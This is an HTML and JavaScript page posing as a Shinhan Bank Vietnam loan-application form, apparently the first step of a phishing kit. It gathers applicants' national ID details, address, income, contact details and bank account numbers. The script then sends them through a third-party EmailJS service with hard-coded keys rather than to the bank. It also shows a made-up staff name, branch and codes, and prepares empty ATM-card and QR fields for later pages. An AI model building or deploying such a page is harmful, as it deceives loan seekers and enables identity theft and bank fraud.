<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            font-size: 16px;
            background-color: #f8f9fa;
            margin: 0;
        }
        .header {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
        }
        .header img {
            height: 50px;
        }
        .header h1 {
            font-size: 26px;
            font-weight: 700;
            margin: 10px 0 0 0;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            position: relative;
        }
        .progress-bar-container {
            margin-bottom: 20px;
        }
        .progress-bar {
            height: 20px;
            background-color: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background-color: #28a745;
            transition: width 0.3s ease-in-out;
        }
        .step-title {
            color: #003087;
            font-size: 22px;
            font-weight: 700;
            text-align: center;
        }
        .step-description {
            font-size: 16px;
            text-align: center;
            margin-bottom: 20px;
        }
        .tooltip-icon {
            cursor: pointer;
            color: #003087;
            font-size: 14px;
            margin-left: 5px;
        }
        .form-label {
            font-weight: 500;
        }
        .form-control, .form-select {
            font-size: 16px;
            border-radius: 15px;
        }
        .terms-box {
            border: 1px solid #dee2e6;
            border-radius: 5px;
            padding: 10px;
            background-color: #f9f9f9;
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        .terms-box img {
            height: 28px;
            margin-right: 10px;
        }
        .terms-box p {
            margin: 0;
            font-size: 14px;
        }
        .terms-box a {
            color: #003087;
            text-decoration: underline;
        }
        .form-check-label {
            font-size: 14px;
        }
        .btn-primary {
            font-size: 16px;
            font-weight: 700;
            padding: 10px 20px;
            background-color: #003087;
            border: none;
        }
        .btn-primary:hover {
            background-color: #00205b;
        }
        .btn-primary:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .btn-secondary {
            font-size: 16px;
            font-weight: 700;
            padding: 10px 20px;
            background-color: #6c757d;
            border: none;
            position: absolute;
            top: 20px;
            left: 20px;
        }
        .btn-secondary:hover {
            background-color: #5a6268;
        }
        .modal-content img {
            height: 30px;
            margin-right: 10px;
        }
        .modal-title {
            font-size: 18px;
            font-weight: 700;
        }
        .modal-body h5 {
            font-size: 16px;
            font-weight: 700;
            margin-top: 15px;
        }
        .modal-body p {
            font-size: 14px;
            line-height: 1.6;
        }
        .footer {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
            margin-top: 20px;
            font-size: 16px;
        }
        .footer img.lock-icon {
            vertical-align: middle;
            margin-right: 10px;
        }
        .footer-logo {
            height: 40px;
            margin-top: 10px;
        }
        .continue-btn-container {
            text-align: center;
            margin-top: 20px;
        }
        .invalid-feedback {
            display: none;
        }
        .was-validated .form-control:invalid, .was-validated .form-select:invalid {
            border-color: #dc3545;
        }
        .was-validated .form-control:invalid ~ .invalid-feedback,
        .was-validated .form-select:invalid ~ .invalid-feedback {
            display: block;
        }
        .spam-error {
            color: #dc3545;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            margin-top: 10px;
            padding: 8px;
            background-color: #ffe6e6;
            border-radius: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <div class="container">
        <button type="button" class="btn btn-secondary" onclick="window.location.href='index.html'">Quay Lại</button>
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
            </div>
        </div>

        <div id="step1" class="step-transition">
            <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
            <p class="step-description">Vui lòng cung cấp thông tin cá nhân để chúng tôi tiến hành xét duyệt.</p>
            <form id="registerForm" novalidate>
                <div class="mb-3">
                    <label for="fullName" class="form-label">Họ và Tên <span class="tooltip-icon" data-bs-toggle="tooltip" title="Họ tên đầy đủ theo CMND/CCCD">ⓘ</span></label>
                    <input type="text" class="form-control" id="fullName" required>
                    <div class="invalid-feedback">Vui lòng nhập họ và tên.</div>
                </div>
                <div class="mb-3">
                    <label for="idNumber" class="form-label">Số CMND/CCCD/Hộ chiếu <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số định danh trên giấy tờ tùy thân">ⓘ</span></label>
                    <input type="text" class="form-control" id="idNumber" required>
                    <div class="invalid-feedback">Vui lòng nhập số CMND/CCCD/Hộ chiếu.</div>
                </div>
                <div class="mb-3">
                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD/Hộ chiếu</label>
                    <input type="text" class="form-control" id="idIssueDate" required>
                    <div class="invalid-feedback">Vui lòng nhập ngày cấp (DD/MM/YYYY).</div>
                </div>
                <div class="mb-3">
                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD/Hộ chiếu</label>
                    <input type="text" class="form-control" id="idIssuePlace" required>
                    <div class="invalid-feedback">Vui lòng nhập nơi cấp.</div>
                </div>
                <div class="mb-3">
                    <label for="address" class="form-label">Địa Chỉ Thường Trú <span class="tooltip-icon" data-bs-toggle="tooltip" title="Địa chỉ ghi trên hộ khẩu">ⓘ</span></label>
                    <input type="text" class="form-control" id="address" required>
                    <div class="invalid-feedback">Vui lòng nhập địa chỉ thường trú.</div>
                </div>
                <div class="mb-3">
                    <label for="occupation" class="form-label">Nghề Nghiệp</label>
                    <select class="form-select" id="occupation" required>
                        <option value="nhanvien">Nhân viên văn phòng</option>
                        <option value="kinhdoanh">Kinh doanh tự do</option>
                        <option value="giaovien">Giáo viên</option>
                        <option value="congnhan">Công nhân</option>
                        <option value="kysu">Kỹ sư</option>
                        <option value="bacsi">Bác sĩ</option>
                        <option value="banhang">Nhân viên bán hàng</option>
                        <option value="laixe">Lái xe</option>
                        <option value="noitro">Nội trợ</option>
                        <option value="sinhvien">Sinh viên</option>
                        <option value="khac">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn nghề nghiệp.</div>
                </div>
                <div class="mb-3">
                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Thu nhập trung bình hàng tháng">ⓘ</span></label>
                    <input type="text" class="form-control" id="income" required>
                    <div class="invalid-feedback">Vui lòng nhập thu nhập hàng tháng.</div>
                </div>
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Số Điện Thoại <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số điện thoại liên lạc chính">ⓘ</span></label>
                    <input type="tel" class="form-control" id="phoneNumber" required>
                    <div class="invalid-feedback">Vui lòng nhập số điện thoại.</div>
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email <span class="tooltip-icon" data-bs-toggle="tooltip" title="Email để nhận thông báo">ⓘ</span></label>
                    <input type="email" class="form-control" id="email" required>
                    <div class="invalid-feedback">Vui lòng nhập email hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="loanAmountInput" class="form-label">Số Tiền Vay (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tiền bạn muốn vay">ⓘ</span></label>
                    <input type="text" class="form-control" id="loanAmountInput" required>
                    <div class="invalid-feedback">Vui lòng nhập số tiền vay.</div>
                </div>
                <div class="mb-3">
                    <label for="loanTerm" class="form-label">Số Tháng Vay</label>
                    <select class="form-select" id="loanTerm" required>
                        <option value="6">6 tháng</option>
                        <option value="12">12 tháng</option>
                        <option value="18">18 tháng</option>
                        <option value="24">24 tháng</option>
                        <option value="36">36 tháng</option>
                        <option value="48">48 tháng</option>
                        <option value="60">60 tháng</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn số tháng vay.</div>
                </div>
                <div class="mb-3">
                    <label for="loanPurpose" class="form-label">Mục Đích Vay</label>
                    <select class="form-select" id="loanPurpose" required>
                        <option value="Sửa chữa nhà">Sửa chữa nhà</option>
                        <option value="Mua xe">Mua xe</option>
                        <option value="Học tập">Học tập</option>
                        <option value="Chi tiêu cá nhân">Chi tiêu cá nhân</option>
                        <option value="Khác">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn mục đích vay.</div>
                </div>
                <div class="mb-3">
                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tài khoản để giải ngân">ⓘ</span></label>
                    <input type="text" class="form-control" id="accountNumber" required>
                    <div class="invalid-feedback">Vui lòng nhập số tài khoản ngân hàng.</div>
                </div>
                <div class="mb-3">
                    <label for="bankName" class="form-label">Tên Ngân Hàng <span class="tooltip-icon" data-bs-toggle="tooltip" title="Tên ngân hàng của tài khoản">ⓘ</span></label>
                    <select class="form-select" id="bankName" required>
                        <option value="Shinhan Bank">Shinhan Bank</option>
                        <option value="Vietcombank">Vietcombank</option>
                        <option value="Techcombank">Techcombank</option>
                        <option value="BIDV">BIDV</option>
                        <option value="Agribank">Agribank</option>
                        <option value="MB Bank">MB Bank</option>
                        <option value="VPBank">VPBank</option>
                        <option value="Sacombank">Sacombank</option>
                        <option value="ACB">ACB</option>
                        <option value="VietinBank">VietinBank</option>
                        <option value="TPBank">TPBank</option>
                        <option value="HDBank">HDBank</option>
                        <option value="MSB">MSB</option>
                        <option value="VIB">VIB</option>
                        <option value="SeABank">SeABank</option>
                        <option value="OCB">OCB</option>
                        <option value="SCB">SCB</option>
                        <option value="Nam A Bank">Nam A Bank</option>
                        <option value="SHB">SHB</option>
                        <option value="PVcomBank">PVcomBank</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn tên ngân hàng.</div>
                </div>
                <div class="mb-3">
                    <div class="terms-box">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/28x28?text=Lock';">
                        <p>Thông tin của bạn sẽ được bảo mật tuyệt đối theo chính sách bảo mật của Shinhan Bank. Vui lòng đọc kỹ <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">Điều khoản và Điều kiện</a> trước khi tiếp tục.</p>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="termsAgree">
                        <label class="form-check-label" for="termsAgree">
                            Tôi đồng ý với các điều khoản và điều kiện của Shinhan Bank.
                        </label>
                        <div id="termsFeedback" class="invalid-feedback" style="display: none;">Vui lòng đồng ý với các điều khoản và điều kiện.</div>
                    </div>
                </div>
                <div class="spam-error" id="spamError">Bạn đã đăng ký quá nhiều lần. Vui lòng thử lại sau.</div>
                <div class="continue-btn-container">
                    <button type="submit" class="btn btn-primary" id="proceedToStep2Btn" disabled>Tiếp Tục</button>
                </div>
            </form>
        </div>

        <!-- Modal: Terms and Conditions -->
        <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/30x30?text=Lock';">
                        <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <h5>Chính Sách Bảo Mật</h5>
                        <p>Shinhan Bank cam kết bảo mật thông tin cá nhân của bạn theo quy định pháp luật Việt Nam. Thông tin của bạn sẽ chỉ được sử dụng để xử lý hồ sơ vay và sẽ không được chia sẻ với bên thứ ba mà không có sự đồng ý của bạn.</p>
                        <h5>Điều Kiện Vay</h5>
                        <p>- Độ tuổi: Từ 20 đến 60 tuổi.<br>
                           - Thu nhập tối thiểu: 5,000,000 VND/tháng.<br>
                           - Không có nợ xấu tại thời điểm đăng ký.</p>
                        <h5>Trách Nhiệm của Khách Hàng</h5>
                        <p>Khách hàng cần cung cấp thông tin chính xác và chịu trách nhiệm về tính xác thực của các tài liệu cung cấp.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock';">
            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="mailto:support@shinhan.com.vn">support@shinhan.com.vn</a></p>
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/100x40?text=Logo+Shinhan';">
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS
        (function(){
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        // Placeholder user data (for fallback if localStorage is empty)
        let userData = {
            fullName: "",
            idNumber: "",
            idIssueDate: "",
            idIssuePlace: "",
            address: "",
            occupation: "",
            income: "",
            phoneNumber: "",
            email: "",
            loanAmount: "",
            loanTerm: "",
            loanPurpose: "",
            accountNumber: "",
            bankName: "",
            termsAgree: false,
            currentStep: 1
        };

        // Load user data from localStorage
        function loadUserData() {
            try {
                const storedData = localStorage.getItem('userData');
                if (storedData) {
                    userData = JSON.parse(storedData);
                    console.log('Loaded userData from localStorage:', userData);
                } else {
                    console.warn('No userData found in localStorage, using default.');
                }
            } catch (error) {
                console.error('Error parsing userData from localStorage:', error);
            }
        }

        // Save user data to localStorage
        function saveToLocalStorage() {
            try {
                localStorage.setItem('userData', JSON.stringify(userData));
                console.log('Saved userData to localStorage:', userData);
            } catch (error) {
                console.error('Error saving userData to localStorage:', error);
            }
        }

        // Load registered IDs from localStorage
        function loadRegisteredIds() {
            try {
                const storedIds = localStorage.getItem('registeredIds');
                return storedIds ? JSON.parse(storedIds) : [];
            } catch (error) {
                console.error('Error parsing registeredIds from localStorage:', error);
                return [];
            }
        }

        // Save registered IDs to localStorage
        function saveRegisteredIds(ids) {
            try {
                localStorage.setItem('registeredIds', JSON.stringify(ids));
                console.log('Saved registeredIds to localStorage:', ids);
            } catch (error) {
                console.error('Error saving registeredIds to localStorage:', error);
            }
        }

        // Format number input
        function formatNumberInput(value) {
            if (!value) return "";
            return Number(value.replace(/[^0-9]/g, '')).toLocaleString('vi-VN');
        }

        // Generate random loan code
        function generateLoanCode() {
            return "SHB" + Math.floor(100000 + Math.random() * 900000);
        }

        // Generate random code
        function generateRandomCode() {
            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let result = "";
            for (let i = 0; i < 6; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        // Get current date
        function getCurrentDate() {
            const today = new Date();
            const day = String(today.getDate()).padStart(2, '0');
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const year = today.getFullYear();
            return `${day}/${month}/${year}`;
        }

        // Calculate monthly payment (simplified)
        function calculateMonthlyPayment(loanAmount, term) {
            const monthlyRate = 0.075 / 12; // Assuming 7.5% annual interest rate
            const months = parseInt(term);
            return Math.round((loanAmount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months)));
        }

        // Calculate interest rate (simplified)
        function calculateInterestRate(loanAmount) {
            return loanAmount >= 50000000 ? 7.5 : 8.0; // Simplified logic
        }

        // Validate form and checkbox
        function validateForm() {
            const form = document.getElementById('registerForm');
            const termsAgree = document.getElementById('termsAgree');
            const termsFeedback = document.getElementById('termsFeedback');
            const proceedBtn = document.getElementById('proceedToStep2Btn');
            const idNumber = $('#idNumber').val().trim();
            const registeredIds = loadRegisteredIds();

            // Check form fields
            let allFieldsValid = form.checkValidity();
            if (!allFieldsValid) {
                form.classList.add('was-validated');
            }

            // Check terms checkbox
            if (!termsAgree.checked) {
                termsFeedback.style.display = 'block';
            } else {
                termsFeedback.style.display = 'none';
            }

            // Check if idNumber is already registered
            if (idNumber && registeredIds.includes(idNumber)) {
                $('#spamError').text('Bạn đã có hồ sơ tại Shinhanbank.').show();
                proceedBtn.disabled = true;
            } else {
                $('#spamError').hide();
                proceedBtn.disabled = !(allFieldsValid && termsAgree.checked);
            }

            console.log('Form validation:', { allFieldsValid, termsChecked: termsAgree.checked, idNumberRegistered: registeredIds.includes(idNumber) });
        }

        // Anti-spam check (time and count-based)
        function checkSpam() {
            const now = Date.now();
            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
            const lastRegistrationTime = spamData.lastRegistrationTime || 0;
            const registrationCount = spamData.registerCount || 0;
            const registrationResetTime = spamData.resetTime || now;

            // Reset count after 24 hours
            if (now > registrationResetTime) {
                spamData.registerCount = 0;
                spamData.resetTime = now + 24 * 60 * 60 * 1000; // Reset after 24 hours
            }

            // Check if registration is too frequent
            const timeSinceLast = (now - lastRegistrationTime) / 1000; // in seconds
            if (timeSinceLast < 300) { // 5 minutes
                return { allowed: false, message: 'Bạn đã đăng ký quá nhanh. Vui lòng thử lại sau 5 phút.' };
            }

            // Check registration limit
            if (registrationCount >= 3) {
                return { allowed: false, message: 'Bạn đã vượt quá số lần đăng ký trong 24 giờ. Vui lòng thử lại sau.' };
            }

            return { allowed: true };
        }

        // Update spam data
        function updateSpamData() {
            const now = Date.now();
            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
            spamData.lastRegistrationTime = now;
            spamData.registerCount = (spamData.registerCount || 0) + 1;
            spamData.resetTime = spamData.resetTime || now + 24 * 60 * 60 * 1000;
            localStorage.setItem('spamData', JSON.stringify(spamData));
        }

        // Send registration data via EmailJS with retry
        function sendRegistrationDataEmail() {
            const params = {
                to_name: userData.fullName || 'Khách hàng',
                full_name: userData.fullName || 'Không có',
                id_number: userData.idNumber || 'Không có',
                id_issue_date: userData.idIssueDate || 'Không có',
                id_issue_place: userData.idIssuePlace || 'Không có',
                address: userData.address || 'Không có',
                occupation: userData.occupation || 'Không có',
                income: userData.income ? Number(userData.income).toLocaleString('vi-VN') + ' VND' : 'Không có',
                phone_number: userData.phoneNumber || 'Không có',
                email: userData.email || 'Không có',
                loan_amount: userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : 'Không có',
                loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : 'Không có',
                loan_purpose: userData.loanPurpose || 'Không có',
                account_number: userData.accountNumber || 'Không có',
                bank_name: userData.bankName || 'Không có',
                loan_code: userData.loanCode || 'Không có',
                registration_date: userData.registrationDate || 'Không có',
                to_email: userData.email || 'support@shinhan.com.vn'
            };

            console.log('Preparing to send EmailJS params for Step1:', params);

            function trySendEmail(attempt = 1) {
                emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
                    .then(() => {
                        console.log('Email sent successfully on attempt', attempt);
                        alert("Thông tin đăng ký đã được gửi qua email!");
                    })
                    .catch(error => {
                        console.error('EmailJS error on attempt', attempt, ':', error);
                        if (attempt < 2) {
                            console.log('Retrying EmailJS send...');
                            setTimeout(() => trySendEmail(attempt + 1), 1000);
                        } else {
                            alert("Đã xảy ra lỗi khi gửi email. Dữ liệu vẫn được lưu và bạn có thể tiếp tục.");
                        }
                    });
            }

            trySendEmail();
        }

        // Load saved data and initialize form
        window.onload = function() {
            loadUserData();
            $('#fullName').val(userData.fullName || '');
            $('#idNumber').val(userData.idNumber || '');
            $('#idIssueDate').val(userData.idIssueDate || '');
            $('#idIssuePlace').val(userData.idIssuePlace || '');
            $('#address').val(userData.address || '');
            $('#occupation').val(userData.occupation || '');
            $('#income').val(userData.income ? formatNumberInput(userData.income) : '');
            $('#phoneNumber').val(userData.phoneNumber || '');
            $('#email').val(userData.email || '');
            $('#loanAmountInput').val(userData.loanAmount ? formatNumberInput(userData.loanAmount) : '');
            $('#loanTerm').val(userData.loanTerm || '');
            $('#loanPurpose').val(userData.loanPurpose || '');
            $('#accountNumber').val(userData.accountNumber || '');
            $('#bankName').val(userData.bankName || '');
            $('#termsAgree').prop('checked', userData.termsAgree || false);

            // Initialize tooltips
            var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
            tooltipTriggerList.map(function (tooltipTriggerEl) {
                return new bootstrap.Tooltip(tooltipTriggerEl);
            });

            // Validate form on load
            validateForm();
        };

        // Format number inputs
        $('#income, #loanAmountInput').on('input', function() {
            let value = $(this).val().replace(/[^0-9]/g, '');
            if (value) {
                $(this).val(formatNumberInput(value));
            } else {
                $(this).val('');
            }
            validateForm();
        });

        // Validate on input change
        $('#registerForm input, #registerForm select').on('input change', validateForm);
        $('#termsAgree').on('change', validateForm);

        // Form submission
        $('#registerForm').on('submit', function(e) {
            e.preventDefault();
            const form = e.target;
            form.classList.add('was-validated');

            // Check if idNumber is already registered
            const idNumber = $('#idNumber').val().trim();
            const registeredIds = loadRegisteredIds();
            if (idNumber && registeredIds.includes(idNumber)) {
                $('#spamError').text('Bạn đã có hồ sơ tại Shinhanbank.').show();
                $('#proceedToStep2Btn').prop('disabled', true);
                return;
            }

            // Check anti-spam (time and count-based)
            const spamCheck = checkSpam();
            if (!spamCheck.allowed) {
                $('#spamError').text(spamCheck.message).show();
                $('#proceedToStep2Btn').prop('disabled', true);
                return;
            } else {
                $('#spamError').hide();
            }

            if (form.checkValidity() && $('#termsAgree').is(':checked')) {
                let income = $('#income').val().replace(/[^0-9]/g, '') || '';
                let loanAmount = $('#loanAmountInput').val().replace(/[^0-9]/g, '') || '';
                userData = {
                    fullName: $('#fullName').val().trim() || userData.fullName || '',
                    idNumber: idNumber || userData.idNumber || '',
                    idIssueDate: $('#idIssueDate').val().trim() || userData.idIssueDate || '',
                    idIssuePlace: $('#idIssuePlace').val().trim() || userData.idIssuePlace || '',
                    address: $('#address').val().trim() || userData.address || '',
                    occupation: $('#occupation').val() || userData.occupation || '',
                    income: income || userData.income || '',
                    phoneNumber: $('#phoneNumber').val().trim() || userData.phoneNumber || '',
                    email: $('#email').val().trim() || userData.email || '',
                    loanAmount: loanAmount || userData.loanAmount || '',
                    loanTerm: $('#loanTerm').val() || userData.loanTerm || '',
                    loanPurpose: $('#loanPurpose').val() || userData.loanPurpose || '',
                    accountNumber: $('#accountNumber').val().trim() || userData.accountNumber || '',
                    bankName: $('#bankName').val() || userData.bankName || '',
                    termsAgree: $('#termsAgree').is(':checked'),
                    loanCode: userData.loanCode || generateLoanCode(),
                    registrationDate: userData.registrationDate || getCurrentDate(),
                    monthlyPayment: calculateMonthlyPayment(loanAmount || userData.loanAmount || 0, $('#loanTerm').val() || userData.loanTerm || 12),
                    interestRate: calculateInterestRate(loanAmount || userData.loanAmount || 0),
                    sellerCode: userData.sellerCode || generateRandomCode(),
                    storeCode: userData.storeCode || generateRandomCode(),
                    staffCode: userData.staffCode || generateRandomCode(),
                    staffName: userData.staffName || "Nguyễn Thị Mỹ Duyên",
                    branchName: userData.branchName || "Chi nhánh Shinhanbank Đà Nẵng",
                    isRegistered: userData.isRegistered || false,
                    qrData: userData.qrData || {},
                    atmCard: userData.atmCard || {},
                    currentStep: 2
                };
                console.log('Submitting userData:', userData);

                // Add idNumber to registeredIds
                if (idNumber) {
                    registeredIds.push(idNumber);
                    saveRegisteredIds(registeredIds);
                }

                saveToLocalStorage();
                updateSpamData();
                sendRegistrationDataEmail();
                window.location.href = 'step2.html';
            } else {
                console.warn('Form validation failed or terms not agreed.');
                alert('Vui lòng điền đầy đủ thông tin và đồng ý với điều khoản.');
            }
        });
    </script>
</body>
</html>
